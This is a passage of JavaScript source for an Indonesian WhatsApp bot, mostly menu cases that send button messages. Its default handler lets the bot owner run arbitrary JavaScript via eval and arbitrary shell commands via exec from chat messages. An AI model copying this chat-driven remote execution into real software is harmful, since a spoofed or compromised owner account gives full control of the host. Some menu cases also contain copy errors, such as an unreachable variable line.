await chika.send5ButImg(from, `` + '' + lang.photooxymenu(prefix), `© ${footer}`,riych, [{"urlButton": {"displayText": "Source Code","url": `${sc}`}},{"urlButton": {"displayText": "Website","url": `${myweb}`}},{"quickReplyButton": {"displayText": "Donasi","id": 'donate'}},{"quickReplyButton": {"displayText": "Back List","id": 'command'}}] )
break
case 'ephotomenu':
var riych = await getBuffer(picak+'Ephoto Menu')
await chika.send5ButImg(from, `` + '' + lang.ephotomenu(prefix), `© ${footer}`,riych, [{"urlButton": {"displayText": "Source Code","url": `${sc}`}},{"urlButton": {"displayText": "Website","url": `${myweb}`}},{"quickReplyButton": {"displayText": "Donasi","id": 'donate'}},{"quickReplyButton": {"displayText": "Back List","id": 'command'}}] )
break
case 'funmenu':
var riych = await getBuffer(picak+'Fun Menu')
await chika.send5ButImg(from, `` + '' + lang.funmenu(prefix), `© ${footer}`,riych, [{"urlButton": {"displayText": "Source Code","url": `${sc}`}},{"urlButton": {"displayText": "Website","url": `${myweb}`}},{"quickReplyButton": {"displayText": "Donasi","id": 'donate'}},{"quickReplyButton": {"displayText": "Back List","id": 'command'}}] )
break
case 'primbonmenu':
var riych = await getBuffer(picak+'Primbon Menu')
await chika.send5ButImg(from, `` + '' + lang.primbonmenu(prefix), `© ${footer}`,riych, [{"urlButton": {"displayText": "Source Code","url": `${sc}`}},{"urlButton": {"displayText": "Website","url": `${myweb}`}},{"quickReplyButton": {"displayText": "Donasi","id": 'donate'}},{"quickReplyButton": {"displayText": "Back List","id": 'command'}}] )
break
case 'convertmenu':
var riych = await getBuffer(picak+'Converter Menu')
await chika.send5ButImg(from, `` + '' + lang.convertmenu(prefix), `© ${footer}`,riych, [{"urlButton": {"displayText": "Source Code","url": `${sc}`}},{"urlButton": {"displayText": "Website","url": `${myweb}`}},{"quickReplyButton": {"displayText": "Donasi","id": 'donate'}},{"quickReplyButton": {"displayText": "Back List","id": 'command'}}] )
break
case 'mainmenu':
var riych = await getBuffer(picak+'Main Menu')
await chika.send5ButImg(from, `` + '' + lang.mainmenu(prefix), `© ${footer}`,riych, [{"urlButton": {"displayText": "Source Code","url": `${sc}`}},{"urlButton": {"displayText": "Website","url": `${myweb}`}},{"quickReplyButton": {"displayText": "Donasi","id": 'donate'}},{"quickReplyButton": {"displayText": "Back List","id": 'command'}}] )
break
case 'databasemenu':
var riych = await getBuffer(picak+'Database Menu')
await chika.send5ButImg(from, `` + '' + lang.groupmenu(prefix), `© ${footer}`,riych, [{"urlButton": {"displayText": "Source Code","url": `${sc}`}},{"urlButton": {"displayText": "Website","url": `${myweb}`}},{"quickReplyButton": {"displayText": "Donasi","id": 'donate'}},{"quickReplyButton": {"displayText": "Back List","id": 'command'}}] )
break
case 'anonymousmenu':
var riych = await getBuffer(picak+'Anonymous Menu')
await chika.send5ButImg(from, `` + '' + lang.anonymousmenu(prefix), `© ${footer}`,riych, [{"urlButton": {"displayText": "Source Code","url": `${sc}`}},{"urlButton": {"displayText": "Website","url": `${myweb}`}},{"quickReplyButton": {"displayText": "Donasi","id": 'donate'}},{"quickReplyButton": {"displayText": "Back List","id": 'command'}}] )
break
case 'islamicmenu':
var riych = await getBuffer(picak+'Islamic Menu')
await chika.send5ButImg(from, `` + '' + lang.islamicmenu(prefix), `© ${footer}`,riych, [{"urlButton": {"displayText": "Source Code","url": `${sc}`}},{"urlButton": {"displayText": "Website","url": `${myweb}`}},{"quickReplyButton": {"displayText": "Donasi","id": 'donate'}},{"quickReplyButton": {"displayText": "Back List","id": 'command'}}] )
break
case 'voicechargermenu':
var riych = await getBuffer(picak+'Voice Charger Menu')
await chika.send5ButImg(from, `` + '' + lang.voicechargermenu(prefix), `© ${footer}`,riych, [{"urlButton": {"displayText": "Source Code","url": `${sc}`}},{"urlButton": {"displayText": "Website","url": `${myweb}`}},{"quickReplyButton": {"displayText": "Donasi","id": 'donate'}},{"quickReplyButton": {"displayText": "Back List","id": 'command'}}] )
break
case 'ownermenu':
var riych = await getBuffer(picak+'Owner Menu')
await chika.send5ButImg(from, `` + '' + lang.ownermenu(prefix), `© ${footer}`,riych, [{"urlButton": {"displayText": "Source Code","url": `${sc}`}},{"urlButton": {"displayText": "Website","url": `${myweb}`}},{"quickReplyButton": {"displayText": "Donasi","id": 'donate'}},{"quickReplyButton": {"displayText": "Back List","id": 'command'}}] )
break
case 'donasi':
var riych = await getBuffer(picak+'Donasi')
await chika.send5ButImg(from, `` + '' + lang.donasi(ownernomer), `© ${footer}`,riych, [{"urlButton": {"displayText": "Source Code","url": `${sc}`}},{"urlButton": {"displayText": "Website","url": `${myweb}`}},{"quickReplyButton": {"displayText": "Donasi","id": 'donate'}},{"quickReplyButton": {"displayText": "Back List","id": 'command'}}] )
break
var riych = await getBuffer(picak+'Constributor')
case 'thanksto': case 'tqto':
await chika.send5ButImg(from, `` + '' + lang.thanksto(), `© ${footer}`,riych, [{"urlButton": {"displayText": "Source Code","url": `${sc}`}},{"urlButton": {"displayText": "Website","url": `${myweb}`}},{"quickReplyButton": {"displayText": "Donasi","id": 'donate'}},{"quickReplyButton": {"displayText": "Back List","id": 'command'}}] )
break
            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                            if (sat == undefined) {
                                bang = util.format(sul)
                            }
                            return m.reply(bang)
                    }
                    try {
                        m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        m.reply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await m.reply(evaled)
                    } catch (err) {
                        await m.reply(String(err))
                    }
                }

                if (budy.startsWith('$')) {
                    if (!isCreator) return m.reply(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if(err) return m.reply(err)
                        if (stdout) return m.reply(stdout)
                    })
                }
			
		if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
                    this.anonymous = this.anonymous ? this.anonymous : {}
                    let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
                    if (room) {
                        if (/^.*(next|leave|start)/.test(m.text)) return
                        if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
                        let other = [room.a, room.b].find(user => user !== m.sender)
                        m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
                            contextInfo: {
                                ...m.msg.contextInfo,
                                forwardingScore: 0,
                                isForwarded: true,
                                participant: other
                            }
                        } : {})
                    }
                    return !0
                }
			
		if (isCmd && budy.toLowerCase() != undefined) {
		    if (m.chat.endsWith('broadcast')) return
		    if (m.isBaileys) return
		    let msgs = global.db.data.database
		    if (!(budy.toLowerCase() in msgs)) return
		    chika.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
		}
        }
        

    } catch (err) {
        m.reply(util.format(err))
    }
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})
